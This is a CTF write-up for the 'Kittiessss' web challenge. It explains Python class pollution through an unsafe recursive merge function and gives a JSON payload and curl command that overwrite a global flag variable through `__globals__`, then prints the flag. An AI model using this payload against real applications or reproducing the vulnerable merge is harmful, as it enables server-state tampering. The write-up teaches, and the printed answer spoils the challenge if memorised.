# Kittiessss - CTF Challenge Write-up

## Introduction
In this challenge, we were given a website related to cats (`https://cats.chals.cyberjousting.com`) and a downloadable file containing the source code of the application. Our goal was to find a hidden "flag" (a secret string formatted as `byuctf{...}`).

## Understanding the Goal
When we look at the source code (`app.py`), we can see a specific part of the code that decides whether or not to give us the flag:

```python
give_flag = False

# ... (some code) ...

if give_flag and cat.get("is_happy"):
    return render_template("flag.html", cat=cat, cat_ascii=cat_ascii)
```

By default, the `give_flag` variable is set to `False` at the very top of the file. Because of this, under normal circumstances, the website will never show us the flag, no matter how "happy" we make our cat. To get the flag, we somehow need to change the value of `give_flag` from `False` to `True`.

## The Vulnerability: Class Pollution
When you create a cat on the website, you send a packet of information (in JSON format) like this:
```json
{
    "name": "Whiskers",
    "age": 3,
    "color": "tabby",
    "is_happy": true
}
```

The website takes this information and "merges" it into a `Cat` object using a custom `merge` function.

Here is what the `merge` function looks like:
```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

The problem with this custom `merge` function is that it doesn't restrict *what* can be merged. In Python, everything is an object, and objects have hidden built-in attributes that let you access the underlying structure of the program itself.

If we send special hidden properties (like `__class__` and `__globals__`), the `merge` function will blindly follow those properties deep into the internal settings of the Python application. This type of vulnerability is known as **Class Pollution** (similar to Prototype Pollution in JavaScript).

## Crafting the Exploit
We want to reach the global variable `give_flag` and set it to `True`.

Since the `merge` function starts with a `Cat` object, we can traverse Python's internal structure to reach the global variables of the file:
1. `__class__`: This accesses the `Cat` class itself.
2. `to_dict`: This accesses a function defined inside the `Cat` class.
3. `__globals__`: This accesses the global variables of the file where the `to_dict` function was defined (which is `app.py`).
4. `give_flag`: This is the target variable we want to change!

We can bundle this path into our JSON payload along with the required cat attributes:

```json
{
    "name": "Hacker Cat",
    "age": 1,
    "color": "black",
    "is_happy": true,
    "__class__": {
        "to_dict": {
            "__globals__": {
                "give_flag": true
            }
        }
    }
}
```

## Executing the Attack
We can send this crafted payload to the website using a tool like `curl`:

```bash
curl -X POST https://cats.chals.cyberjousting.com/cat \
     -H "Content-Type: application/json" \
     -d '{
        "name": "Hacker Cat",
        "age": 1,
        "color": "black",
        "is_happy": true,
        "__class__": {
            "to_dict": {
                "__globals__": {
                    "give_flag": true
                }
            }
        }
     }'
```

When the server receives this payload, the `merge` function overrides the global `give_flag` variable to `True`. Then, when it checks `if give_flag and cat.get("is_happy"):`, both conditions are finally met!

The server responds with the HTML containing our flag:
**`byuctf{y0u_m4d3_k1tty_h4ppy}`**
